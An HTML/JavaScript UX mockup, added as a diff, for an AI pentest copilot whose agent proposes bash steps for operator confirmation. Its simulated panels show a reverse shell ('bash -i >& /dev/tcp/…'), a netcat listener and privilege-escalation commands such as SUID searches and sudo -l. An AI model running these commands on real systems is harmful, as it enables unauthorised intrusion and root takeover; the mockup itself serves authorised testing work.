@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>pentest-copilot · макет UX + task / manual / stop</title>
+  <style>
+    :root {
+      --bg: #0d1117;
+      --panel: #161b22;
+      --border: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --amber: #d29922;
+      --red: #f85149;
+      --magenta: #db61a2;
+      --font: ui-monospace, "Cascadia Code", "SF Mono", Menlo, Consolas, monospace;
+      --sans: system-ui, "Segoe UI", sans-serif;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-size: 14px;
+      line-height: 1.45;
+    }
+    header {
+      padding: 1rem 1.25rem;
+      border-bottom: 1px solid var(--border);
+      background: var(--panel);
+    }
+    header h1 {
+      margin: 0 0 0.35rem;
+      font-size: 1.05rem;
+      font-weight: 600;
+    }
+    header p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 0.85rem;
+      max-width: 78ch;
+    }
+    .toolbar {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      align-items: center;
+      padding: 0.75rem 1.25rem;
+      border-bottom: 1px solid var(--border);
+    }
+    button {
+      background: var(--border);
+      color: var(--text);
+      border: 1px solid var(--border);
+      padding: 0.35rem 0.75rem;
+      border-radius: 6px;
+      cursor: pointer;
+      font: inherit;
+      font-size: 0.85rem;
+    }
+    button:hover { border-color: var(--accent); color: var(--accent); }
+    button.primary { border-color: var(--amber); color: var(--amber); }
+    button.danger { border-color: var(--red); color: var(--red); }
+    .hint { color: var(--muted); font-size: 0.8rem; flex: 1; min-width: 200px; }
+
+    /* Имитация «шапки» REPL copilot */
+    .chrome {
+      margin: 1rem 1.25rem 0;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+      background: var(--panel);
+    }
+    .chrome-title {
+      padding: 0.35rem 0.65rem;
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      color: var(--muted);
+      border-bottom: 1px solid var(--border);
+      font-family: var(--font);
+    }
+    .running-strip {
+      padding: 0.45rem 0.65rem;
+      font-family: var(--font);
+      font-size: 0.78rem;
+      color: var(--muted);
+      border-bottom: 1px solid var(--border);
+      min-height: 2rem;
+    }
+    .running-strip strong { color: var(--green); font-weight: normal; }
+    .running-strip .slot {
+      color: var(--accent);
+    }
+
+    .event-feed {
+      padding: 0.5rem 0.65rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.45rem;
+      max-height: 220px;
+      overflow-y: auto;
+      font-family: var(--font);
+      font-size: 0.74rem;
+    }
+    .event {
+      border-radius: 6px;
+      padding: 0.45rem 0.55rem;
+      border-left: 3px solid var(--amber);
+      background: rgba(210, 153, 34, 0.08);
+      animation: in 0.25s ease-out;
+    }
+    .event.done { border-left-color: var(--green); background: rgba(63, 185, 80, 0.08); }
+    .event.task { border-left-color: var(--magenta); background: rgba(219, 97, 162, 0.08); }
+    .event.manual { border-left-color: var(--accent); background: rgba(88, 166, 255, 0.08); }
+    .event .tag {
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--muted);
+      display: block;
+      margin-bottom: 0.25rem;
+    }
+    @keyframes in {
+      from { opacity: 0; transform: translateY(-4px); }
+      to { opacity: 1; transform: none; }
+    }
+
+    .task-banner {
+      margin: 0.65rem;
+      padding: 0.55rem 0.65rem;
+      border: 1px solid var(--magenta);
+      border-radius: 8px;
+      font-family: var(--font);
+      font-size: 0.78rem;
+      color: #f2cbd9;
+      display: none;
+    }
+    .task-banner.visible { display: block; }
+
+    .repl-box {
+      padding: 0.55rem 0.65rem 0.65rem;
+      border-top: 1px solid var(--border);
+      font-family: var(--font);
+      font-size: 0.78rem;
+    }
+    .repl-box .prompt { color: var(--green); margin-right: 0.35rem; }
+    .repl-hint {
+      margin-top: 0.35rem;
+      font-size: 0.72rem;
+      color: var(--muted);
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 1rem;
+      padding: 1rem 1.25rem;
+      align-items: start;
+    }
+
+    .term-card {
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+      background: var(--panel);
+      display: flex;
+      flex-direction: column;
+      min-height: 200px;
+      transition: opacity 0.35s ease, max-height 0.45s ease, margin 0.35s ease, padding 0.35s ease;
+      max-height: 500px;
+    }
+    .term-card.hidden-slot {
+      opacity: 0.35;
+      max-height: 0;
+      min-height: 0;
+      margin: 0;
+      padding: 0;
+      border: none;
+      overflow: hidden;
+      pointer-events: none;
+    }
+    .term-card.active { box-shadow: 0 0 0 1px var(--accent); }
+    .term-head {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 0.5rem;
+      padding: 0.6rem 0.75rem;
+      border-bottom: 1px solid var(--border);
+      background: rgba(0,0,0,.2);
+    }
+    .term-head .title {
+      font-family: var(--font);
+      font-size: 0.78rem;
+      word-break: break-all;
+    }
+    .term-head .title strong {
+      color: var(--accent);
+      display: block;
+      margin-bottom: 0.2rem;
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+    .badge {
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      padding: 0.15rem 0.45rem;
+      border-radius: 4px;
+      white-space: nowrap;
+    }
+    .badge.run { background: rgba(63, 185, 80, 0.15); color: var(--green); animation: pulse 1.2s ease-in-out infinite; }
+    .badge.idle { background: var(--border); color: var(--muted); }
+    .badge.stopped { background: rgba(248, 81, 73, 0.15); color: var(--red); }
+    @keyframes pulse { 50% { opacity: 0.65; } }
+
+    .term-body {
+      flex: 1;
+      font-family: var(--font);
+      font-size: 0.78rem;
+      line-height: 1.5;
+      padding: 0.65rem 0.75rem;
+      color: #c9d1d9;
+      white-space: pre-wrap;
+      word-break: break-word;
+      min-height: 4.5rem;
+    }
+    .term-body .dim { color: var(--muted); }
+    .term-foot {
+      padding: 0.45rem 0.75rem;
+      border-top: 1px solid var(--border);
+      font-size: 0.72rem;
+      color: var(--muted);
+      font-family: var(--font);
+    }
+
+    .legend {
+      margin: 0 1.25rem 1rem;
+      padding: 0.75rem 1rem;
+      border: 1px dashed var(--border);
+      border-radius: 8px;
+      font-size: 0.82rem;
+      color: var(--muted);
+    }
+    .legend code { color: var(--accent); font-family: var(--font); font-size: 0.78rem; }
+    .legend ul { margin: 0.5rem 0 0 1.1rem; padding: 0; }
+    .legend li { margin: 0.35rem 0; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Макет: несколько процессов + события как в copilot</h1>
+    <p>
+      Сверху — как в реальном хосте: полоска <strong>● running</strong>, лента событий (завершение фона → транскрипт + memory),
+      затем превью двух слотов. Ниже — подсказки команд <code>task</code> / <code>manual</code> / <code>stop</code>.
+      Запуск: <code style="color:var(--accent)">python mock/serve_mock.py</code>
+    </p>
+  </header>
+
+  <div class="toolbar">
+    <button type="button" id="btnPause">Пауза логов</button>
+    <button type="button" id="btnReset">Сброс всего</button>
+    <button type="button" class="danger" id="btnStop1">Сценарий: stop 1 (слушатель умер)</button>
+    <button type="button" class="primary" id="btnTaskDemo">Сценарий: шаг task</button>
+    <button type="button" id="btnManualDemo">Сценарий: manual</button>
+    <span class="hint">Кнопки имитируют то, что делает REPL после <code>stop</code> / <code>task</code> / <code>manual</code></span>
+  </div>
+
+  <div class="chrome">
+    <div class="chrome-title">copilot · один терминал (Rich)</div>
+    <div class="running-strip" id="runningStrip">
+      <span id="runningContent"><strong>● running</strong> <span class="slot">[1]⌁</span> pid=88421 nc -lvnp 4444 — …　<span class="slot">[2]</span> pid=88488 bash -i /dev/tcp/…</span>
+    </div>
+    <div class="event-feed" id="eventFeed"></div>
+    <div class="task-banner" id="taskBanner">
+      <strong style="color:var(--magenta)">task · агент</strong><br />
+      Цель: повысить привилегии с www-data до root<br />
+      <span style="color:var(--muted)">шаг 2 / 12 · дальше то же меню [1]/[s]/… · trust ускоряет</span>
+    </div>
+    <div class="repl-box">
+      <div><span class="prompt">›</span><span id="replLine">task найди SUID и странные capabilities на жертве</span></div>
+      <div class="repl-hint" id="replHint">Подсказка: цикл остановится, если модель вернёт ответ без bash-блоков.</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <article class="term-card active" id="cardA" data-slot="A">
+      <div class="term-head">
+        <div class="title">
+          <strong>Слот 1 · атакующий хост</strong>
+          nc -lvnp 4444 — слушатель reverse shell
+        </div>
+        <span class="badge run" id="badgeA">running</span>
+      </div>
+      <div class="term-body" id="bodyA"><span class="dim">(ждём строк…)</span></div>
+      <div class="term-foot">Превью: последние 3 строки · полный лог → logs/&lt;job&gt;.stdout.log · выжимка → memory</div>
+    </article>
+
+    <article class="term-card" id="cardB" data-slot="B">
+      <div class="term-head">
+        <div class="title">
+          <strong>Слот 2 · сессия на цели</strong>
+          bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1
+        </div>
+        <span class="badge idle" id="badgeB">idle</span>
+      </div>
+      <div class="term-body" id="bodyB"><span class="dim">ждём коннект к слушателю…</span></div>
+      <div class="term-foot">stdin по слоту: <code>stdin 1 строка</code> только если [4] фон+PIPE</div>
+    </article>
+  </div>
+
+  <div class="legend">
+    <strong style="color:var(--text)">Соответствие реальному хосту</strong>
+    <ul>
+      <li><code>stop N</code> / <code>kill N</code> — SIGTERM фону; слот пропадает из <strong>● running</strong>; панель «процесс остановлен» + транскрипт + разбор логов в memory.</li>
+      <li><code>manual …</code> — твои действия вне copilot попадают в транскрипт и memory (note), модель их видит.</li>
+      <li><code>task …</code> — цикл LLM → bash с тем же меню подтверждения; без bash в ответе цикл стоп.</li>
+    </ul>
+  </div>
+
+  <script>
+(function () {
+  const linesA = [
+    "listening on [any] 4444 ...",
+    "connect to [10.10.14.12] from [10.10.10.40] 49812",
+    "bash: cannot set terminal process group: Inappropriate ioctl for device",
+    "id",
+    "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+  ];
+  const linesB = [
+    "bash: trying connection ...",
+    "connected.",
+    "ls -la /var/www",
+    "total 48",
+    "drwxr-xr-x 3 www-data www-data 4096 html",
+  ];
+
+  let paused = false;
+  let i = 0, j = 0;
+  let slotAKilled = false;
+  let timer = null;
+
+  const bodyA = document.getElementById("bodyA");
+  const bodyB = document.getElementById("bodyB");
+  const badgeA = document.getElementById("badgeA");
+  const badgeB = document.getElementById("badgeB");
+  const cardA = document.getElementById("cardA");
+  const runningContent = document.getElementById("runningContent");
+  const eventFeed = document.getElementById("eventFeed");
+  const taskBanner = document.getElementById("taskBanner");
+  const replLine = document.getElementById("replLine");
+
+  const hints = [
+    "manual зашёл в /home/www-data, нашёл .backup с паролем админа — записал в память для модели",
+    "stop 1 после того как вытащил нужный файл с шелла",
+    "task проверь cron, writable systemd unit и sudo -l без пароля",
+  ];
+  let hintIdx = 0;
+  setInterval(function () {
+    hintIdx = (hintIdx + 1) % hints.length;
+    document.getElementById("replHint").textContent = "Пример ввода: " + hints[hintIdx];
+  }, 3800);
+
+  function tail(arr, n) {
+    return arr.slice(-n).join("\n");
+  }
+
+  function pushEvent(html, cls) {
+    const el = document.createElement("div");
+    el.className = "event " + (cls || "");
+    el.innerHTML = html;
+    eventFeed.insertBefore(el, eventFeed.firstChild);
+    while (eventFeed.children.length > 6) {
+      eventFeed.removeChild(eventFeed.lastChild);
+    }
+  }
+
+  function updateRunningStrip() {
+    if (slotAKilled) {
+      runningContent.innerHTML =
+        '<strong>● running</strong> <span class="slot">[1]</span> pid=88488 bash -i /dev/tcp/… — слот слушателя закрыт после <code style="color:#58a6ff">stop 1</code>';
+      return;
+    }
+    runningContent.innerHTML =
+      '<strong>● running</strong> <span class="slot">[1]⌁</span> pid=88421 nc -lvnp 4444 — …　<span class="slot">[2]</span> pid=88488 bash -i /dev/tcp/…';
+  }
+
+  function tick() {
+    if (paused || slotAKilled) return;
+    if (i < linesA.length) {
+      bodyA.textContent = tail(linesA.slice(0, i + 1), 3);
+      i++;
+    }
+    if (i >= 2 && j < linesB.length) {
+      badgeB.textContent = "running";
+      badgeB.className = "badge run";
+      bodyB.textContent = tail(linesB.slice(0, j + 1), 3);
+      j++;
+    }
+    if (i >= linesA.length && j >= linesB.length && !slotAKilled) {
+      badgeA.className = "badge idle";
+      badgeA.textContent = "done";
+      badgeB.className = "badge idle";
+      badgeB.textContent = "done";
+      clearInterval(timer);
+      timer = null;
+      pushEvent(
+        '<span class="tag">● процесс остановлен</span>слот сам вышел · exit=0 · nc — слушатель закрыт клиентом<br /><span style="color:#8b949e">→ транскрипт · выжимка → memory</span>',
+        "done"
+      );
+      updateRunningStrip();
+    }
+  }
+
+  function startTimer() {
+    if (timer) clearInterval(timer);
+    timer = setInterval(tick, 850);
+  }
+
+  function killSlot1Demo() {
+    if (slotAKilled) return;
+    slotAKilled = true;
+    paused = false;
+    badgeA.textContent = "stopped";
+    badgeA.className = "badge stopped";
+    bodyA.textContent = "(listener terminated)";
+    pushEvent(
+      '<span class="tag">● процесс остановлен</span>фон · stdinPIPE · <span style="color:#58a6ff">a1b2c3d4e5</span> · exit=-15<br />```bash<br />nc -lvnp 4444<br />```<br /><span style="color:#8b949e">→ transcription · distill logs → memory</span>',
+      "done"
+    );
+    updateRunningStrip();
+    setTimeout(function () {
+      cardA.classList.add("hidden-slot");
+    }, 900);
+  }
+
+  document.getElementById("btnStop1").onclick = killSlot1Demo;
+
+  document.getElementById("btnTaskDemo").onclick = function () {
+    taskBanner.classList.add("visible");
+    replLine.textContent = "find / -perm -4000 -type f 2>/dev/null | head -40";
+    pushEvent(
+      '<span class="tag">task · автошаг</span>Модель предложила bash → ты жмёшь [1]/[s]/… как обычно.<br /><span style="color:#8b949e">Наблюдение в промпте: memory + jobs + todo + скоуп</span>',
+      "task"
+    );
+  };
+
+  document.getElementById("btnManualDemo").onclick = function () {
+    replLine.textContent = "manual с другого терминала: sudo -l от www-data → (NOPASSWD) /usr/bin/python3";
+    pushEvent(
+      '<span class="tag">manual → транскрипт + memory</span>Оператор зафиксировал ручной вывод; модель увидит в цепочке фактов.',
+      "manual"
+    );
+  };
+
+  document.getElementById("btnPause").onclick = function () {
+    paused = !paused;
+    this.textContent = paused ? "Продолжить логи" : "Пауза логов";
+  };
+
+  document.getElementById("btnReset").onclick = function () {
+    clearInterval(timer);
+    timer = null;
+    paused = false;
+    slotAKilled = false;
+    i = 0; j = 0;
+    document.getElementById("btnPause").textContent = "Пауза логов";
+    bodyA.innerHTML = '<span class="dim">(ждём строк…)</span>';
+    bodyB.innerHTML = '<span class="dim">ждём коннект к слушателю…</span>';
+    badgeB.className = "badge idle";
+    badgeB.textContent = "idle";
+    badgeA.className = "badge run";
+    badgeA.textContent = "running";
+    cardA.classList.remove("hidden-slot");
+    taskBanner.classList.remove("visible");
+    replLine.textContent = "task найди SUID и странные capabilities на жертве";
+    eventFeed.innerHTML = "";
+    updateRunningStrip();
+    startTimer();
+  };
+
+  updateRunningStrip();
+  startTimer();
+})();
+  </script>
+</body>
+</html>
